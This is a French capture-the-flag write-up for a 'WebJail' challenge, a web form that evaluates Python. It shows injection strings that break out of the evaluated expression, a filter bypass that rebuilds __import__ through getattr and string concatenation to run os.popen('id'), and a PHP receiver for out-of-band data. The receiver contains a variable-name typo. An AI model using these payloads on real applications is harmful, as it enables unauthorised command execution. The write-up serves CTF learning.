# WebJail

**Introduction**

- Le challenge nous fournit une page qui nous offre la possibilité d'exécuter des commandes via un formulaire.
- Note, les données de formulaire sont représentées de la manière suivante: ``command=rand&execute=Execute``
<br/>

![image](https://user-images.githubusercontent.com/74382279/157317880-896d7863-c7bd-4384-8bc6-b6ae7b3081a3.png)

J'essaye d'envoyer une commande Python: ``print(1)``, mais aucun résultat. Je suppose donc qu'on doit jouer avec la requête pour trouver le bon point d'entrée.<br/>
Pour ce faire je teste plusieurs techniques d'escape, quand finalement j'obtiens un résultat différent. La commande suivante: ``);print(1)#``

![image](https://user-images.githubusercontent.com/74382279/157317785-2baf2def-ea0a-48e6-9e94-1079e55cc2a7.png)

L'idée est d'importer une lib (os) pour exécuter des commandes Bash. Donc je tente d'importer la lib ``os`` pour exécuter ``id``: ``);import os;os.popen('id').read()#``.
Malheur, j'obtiens la réponse ``Blocked``. Je pars du principe que le chall contient un filtre qui match plusieurs fonctions Python.
<br/>

![image](https://user-images.githubusercontent.com/74382279/157318532-29ad4480-d328-4db3-afcd-5042f5be7e0e.png)

Je vais devoir builtin des fontions à partir de la lib ``__builtins__``.
La méthode ``getattr()`` renvoie la valeur de l'attribut nommé d'un objet. S'il n'est pas trouvé, il renvoie la valeur par défaut fournie à la fonction.
``);geattr(__builtins__,'__imp''ort__')('o''s').popen('id')#``, par défaut j'utilise une méthode de concaténation pour éviter de faire trigger la commande par le filtre.
N'oublions pas que la méthode ``read()`` n'est pas acceptée. Dans ce contexte on est supposé d'envoyer la requête en stdout vers un serveur web qu'on hébergera localement pour récupérer les données ``POST``. Tout ça ``OOB`` (Out of band). Les données ``OOB`` sont transférées via un flux indépendant du flux de données principal dans la bande.
J'utilise Wampserv comme hébergeur local. First of all je script la fonction suivante en ``PHP``:

```php
<?php

if(isset($_POST["data"]) && !empty($_POST["data"])) {
  $handle = fopen("data.txt", "a+");
  fwrite($handel, $_POST["data"] . "\n");
  fclose($handle);
}

echo file_get_contents("data.txt");

?>
```

